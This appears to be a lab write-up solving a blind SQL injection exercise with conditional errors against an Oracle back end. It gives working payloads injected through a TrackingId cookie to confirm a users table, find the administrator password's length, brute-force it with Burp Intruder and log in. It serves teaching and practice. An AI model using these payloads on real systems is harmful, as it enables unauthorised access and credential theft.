## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/235318856-32ac64d1-b466-40d0-a520-c815ea69df36.png)


## Solution :

Request looks like this 

![image](https://user-images.githubusercontent.com/67383098/235318945-32c26ed1-f2d8-43f0-b0b1-deb1c8bc8f75.png)

Query looks like the following 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

#### Inducing error message -

1. Add an extra `'` symbol. We see that error appears because of incorrect ssql syntax 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

![image](https://user-images.githubusercontent.com/67383098/235319137-b717782b-96c8-4f6a-93eb-2241a20a297b.png)


2. Add 2 extra `'` symbol, we get a response  back which indicates that the sql syntax is correct ('' indicates opening and closing of query & hence correct sql query)

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''
```
![image](https://user-images.githubusercontent.com/67383098/235319162-3d6159c1-d5e3-4703-9946-371fe3ec3210.png)


#### Conform the reason for error is invalid SQL query -

1. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: `TrackingId=xyz'||(SELECT '')||'`

![image](https://user-images.githubusercontent.com/67383098/235319327-c9fdadf8-e1a3-4902-a635-a279b2e66d84.png)


In this case, notice that the query still appears to be invalid. This may be because the database used here is **ORACLE** & for that we need to specify a table called **DUAL**. Hence we got this error.

2. Try specifying a predictable table name in the query: `TrackingId=xyz'||(SELECT '' FROM dual)||'`


![image](https://user-images.githubusercontent.com/67383098/235319432-f317d280-2569-49a3-8a7d-dc5738e36dcb.png)

We get  a response without any error , we can confrom that it is an ORACLE database *which requires all SELECT statements to explicitly specify a table name*. 

3. To conform this we can give an invalid query by specifying some random table `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`


![image](https://user-images.githubusercontent.com/67383098/235319570-07267d19-6dee-473c-ad03-c39dc04cf3cb.png)

Hence confirmed.

#### Verify users table exist -

We can verify whether *users* table exist or not by the following command `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`


![image](https://user-images.githubusercontent.com/67383098/235319702-f5296c8c-4ecd-4999-ad71-a91689753022.png)

No error -> implies that users table exist.

> NOTE - Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break > our concatenation. 

#### Checking whether administrator user is present in db -

We can exploit this error inducing queries to test if admin user is present or not

1. Set **(1=1)** ie. Condition is TRUE - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image](https://user-images.githubusercontent.com/67383098/235319941-2d982c91-19cc-476a-b4e6-0b6038784779.png)

We receive an error. means the condition is *TRUE* so it threw an **divide by 0** error

2. Set **(1=2)** ie. Condition is FALSE - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image](https://user-images.githubusercontent.com/67383098/235320055-5e2c3f57-85ce-4094-9f98-52c614998e7c.png)

We get a 200 response , means the condition failed and hence it returned nothing !

> NOTE- This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition 
> and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains
> a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the
> condition is true.

3. We can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username *administrator* exists: 

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![image](https://user-images.githubusercontent.com/67383098/235320189-6f45a26f-c725-4026-8646-fe910e9e8c44.png)

It shows an error which means there is indeed a user called *administrator*

#### Determine the length of admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

RESPONSE -

1. ERROR -> Condition is TRUE
2. NUlll response -> Condition is FALSE

The length of password will be definitly > 1 , so we get an error.

![image](https://user-images.githubusercontent.com/67383098/235320395-6a64d7af-0ac8-4b05-bbe2-9c4f3592d92b.png)

AUTOMATE THIS by Burp Intruder , by adding password length *(LENGTH>1)* as payload .

From req 20, we get an error where condition is *(LENGTH > 20)*

![image](https://user-images.githubusercontent.com/67383098/235320504-61d5226a-616b-4baa-a6eb-e71295e96eba.png)

This means that the password size is exactly **20** characters.

#### Bruteforce the admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Add the length of password & each letter to be bruteforced as payloads.

ATTACK TYPE - CLUSTER BOMB
Payload 1 - Numbers
Payload 2 - Bruteforcer

We get the 20 responses which returned a error.

![image](https://user-images.githubusercontent.com/67383098/235320938-5bcc6aa5-6d79-4303-8f0c-17cb96d95b89.png)


Thus we got the admin's password - `8fysuozl95mngaem0abi`

Now we can log in as administrator ,

![image](https://user-images.githubusercontent.com/67383098/235321065-491fa7f1-59c8-4efb-8fb3-ae45ac8f96ae.png)









































